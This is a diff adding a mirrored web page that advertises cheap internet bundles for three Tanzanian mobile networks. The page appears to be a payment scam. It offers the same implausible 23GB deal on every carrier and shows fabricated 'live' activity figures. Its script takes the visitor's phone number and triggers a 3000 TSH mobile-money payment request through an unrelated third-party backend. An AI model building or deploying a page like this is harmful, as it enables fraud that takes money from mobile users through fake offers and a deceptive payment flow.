@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from unlockvip-frontend.onrender.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 07 Mar 2026 14:16:31 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Internet Bundles</title>
+
+<link rel="stylesheet" href="style.css">
+
+</head>
+
+<body>
+
+<div class="page-container">
+
+<h1 class="title">Experience The Future</h1>
+
+<div class="phone-box">
+<p>Enter Phone Number</p>
+<input id="phone" placeholder="07XXXXXXXX">
+</div>
+
+<div id="loading">
+<div class="spinner"></div>
+<p>Processing payment request...</p>
+</div>
+
+<div id="success">
+✅ Payment request sent to your phone.
+Please confirm the payment.
+</div>
+
+<div class="card-container">
+
+<div class="card" data-network="halotel">
+
+<h3>HALOTEL</h3>
+<img src="images/halotel.jpg" class="logo">
+
+<div class="circle">
+<div class="bundle">
+<h2>23GB</h2>
+<p>3000 TSH</p>
+<span>VALID FOR 3 MONTHS</span>
+</div>
+</div>
+
+<button onclick="buy()">Buy Now</button>
+
+</div>
+
+
+<div class="card" data-network="yas">
+
+<h3>YAS</h3>
+<img src="images/yas.jpg" class="logo">
+
+<div class="circle">
+<div class="bundle">
+<h2>23GB</h2>
+<p>3000 TSH</p>
+<span>VALID FOR 3 MONTHS</span>
+</div>
+</div>
+
+<button onclick="buy()">Buy Now</button>
+
+</div>
+
+
+<div class="card" data-network="airtel">
+
+<h3>AIRTEL</h3>
+<img src="images/airtel.jpg" class="logo">
+
+<div class="circle">
+<div class="bundle">
+<h2>23GB</h2>
+<p>3000 TSH</p>
+<span>VALID FOR 3 MONTHS</span>
+</div>
+</div>
+
+<button onclick="buy()">Buy Now</button>
+
+</div>
+
+</div>
+
+
+<section class="features">
+
+<h2>📊 Live Network Activity</h2>
+
+<div class="features-grid">
+
+<div id="usersOnline" class="feature-box">Users Online: 0</div>
+
+<div id="networkSpeed" class="feature-box">Network Speed: -- Mbps</div>
+
+<div id="bundlesSold" class="feature-box">Bundles Today: 1200</div>
+
+<div id="networkLoad" class="feature-box">Network Load: 70%</div>
+
+</div>
+
+</section>
+
+</div>
+
+
+<script>
+
+/* PAYMENT */
+
+async function buy(){
+
+const phone=document.getElementById("phone").value
+
+if(!phone){
+alert("Enter phone number")
+return
+}
+
+document.getElementById("loading").style.display="block"
+document.getElementById("success").style.display="none"
+
+try{
+
+const response=await fetch("https://unlockvip-backend.onrender.com/create-payment",{
+
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+
+body:JSON.stringify({
+amount:3000,
+phone:phone
+})
+
+})
+
+const result=await response.json()
+
+document.getElementById("loading").style.display="none"
+
+if(result.success){
+document.getElementById("success").style.display="block"
+}else{
+alert(result.error||"Payment failed")
+}
+
+}catch(error){
+
+document.getElementById("loading").style.display="none"
+alert("Server error")
+
+}
+
+}
+
+
+/* NETWORK AUTO DETECT */
+
+const phoneInput=document.getElementById("phone")
+const cards=document.querySelectorAll(".card")
+
+phoneInput.addEventListener("input",()=>{
+
+const number=phoneInput.value
+
+cards.forEach(card=>{
+card.classList.remove("active-network")
+})
+
+if(number.startsWith("062")){
+activate("halotel")
+}
+
+else if(
+number.startsWith("074") ||
+number.startsWith("075") ||
+number.startsWith("076")
+){
+activate("yas")
+}
+
+else if(
+number.startsWith("068") ||
+number.startsWith("069")
+){
+activate("airtel")
+}
+
+})
+
+function activate(network){
+
+cards.forEach(card=>{
+
+if(card.dataset.network===network){
+card.classList.add("active-network")
+}
+
+})
+
+}
+
+</script>
+
+<script src="frontend-features.js"></script>
+
+</body>
+
+<!-- Mirrored from unlockvip-frontend.onrender.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 07 Mar 2026 14:16:35 GMT -->
+</html>
